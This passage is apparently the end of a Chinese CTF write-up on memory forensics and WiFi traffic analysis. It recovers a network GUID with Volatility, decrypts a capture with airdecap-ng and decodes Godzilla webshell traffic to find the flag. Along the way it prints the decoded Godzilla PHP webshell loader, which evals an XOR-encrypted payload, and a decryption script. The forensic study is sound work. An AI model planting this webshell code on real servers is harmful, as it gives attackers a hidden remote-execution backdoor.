+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol6.png"></p>
+<p>在怎么获取guid这个问题上卡了很久，一直以为是从注册表获取，但是找了注册表常见的一些位置都没有发现网络适配器的guid。后来看了雪殇的<a target="_blank" rel="noopener" href="http://www.snowywar.top/?p=2554">wp</a>，发现原来直接查看文件找<code>Interfaces</code>就可以…</p>
+<p><code>.\volatility.exe -f &quot;Windows 7-dde00fa9.vmem&quot; --profile Win7SP1x86 filescan | grep Interfaces</code></p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol13.png"></p>
+<p>解压密码需要guid和<code>&#123;&#125;</code>一起输入，解压后得到密码</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol14.png"></p>
+<blockquote>
+<p>这里没发现<code>客户端.cap</code>是加密的，因为没见过这种题，知识盲区，太菜了</p>
+</blockquote>
+<p>加密后的<code>客户端.cap</code>：</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol15.png"></p>
+<p>用<code>airdecap-ng</code>进行解密，密码为之前发现的密码</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol16.png"></p>
+<blockquote>
+<p>-e  SSID</p>
+</blockquote>
+<p>查看服务端流量，直接看http</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol17.png"></p>
+<p>结合后续两个请求，可以确认为哥斯拉shell初始化的流量特征，urldecode-翻转-base64decode后得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;key&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>哥斯拉的加密函数和解密函数相同</p>
+<p>查看解密后的客户端流量，找到客户端返回结果：哥斯拉初始化shell的下一个tcp流</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol18.png"></p>
+<p>解密响应内容，只需解密首尾16位md5以外的内容，即哥斯拉的输出内容：<code>fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=</code></p>
+<p>哥斯拉输出结果是将结果使用gzencode压缩后加密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span>=gzencode(<span class="variable">$result</span>,<span class="number">6</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br></pre></td></tr></table></figure>
+
+<p>解密脚本如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&#x27;fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> gzdecode(encode(base64_decode(<span class="variable">$tmp</span>),<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>解密后即可获取flag</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol19.png"></p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://r0fus0d.blog.ffffffff0x.com/post/memory_forensics/">内存取证(总结篇)</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.snowywar.top/?p=2554">陇剑杯wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://0x0c.cc/2020/12/05/%E5%B7%A7%E7%94%A8Zeek%E5%9C%A8%E6%B5%81%E9%87%8F%E5%B1%82%E7%8B%A9%E7%8C%8E%E5%93%A5%E6%96%AF%E6%8B%89Godzilla/">哥斯拉流量特征</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Write-Up/" rel="tag"># Write-Up</a>
+              <a href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" rel="tag"># 内存取证</a>
+              <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag"># 流量分析</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/19/ictf%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%85%E7%94%9F%E8%AF%95%E9%AA%8C%E5%9C%BAwp/" rel="prev" title="ictf网络安全内生试验场wp">
+      <i class="fa fa-chevron-left"></i> ictf网络安全内生试验场wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">1.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">Volatility简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">1.2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">基础使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E6%8F%92%E4%BB%B6%E5%88%97%E8%A1%A8"><span class="nav-number">1.4.</span> <span class="nav-text">支持的插件列表</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">实战题目</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%87%E5%89%91%E6%9D%AF%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">陇剑杯内存分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%87%E5%89%91%E6%9D%AFWifi"><span class="nav-number">2.2.</span> <span class="nav-text">陇剑杯Wifi</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="chaser"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">chaser</p>
+  <div class="site-description" itemprop="description">文档工程师 摸鱼砖家</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chaserw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chaserw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chaser</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
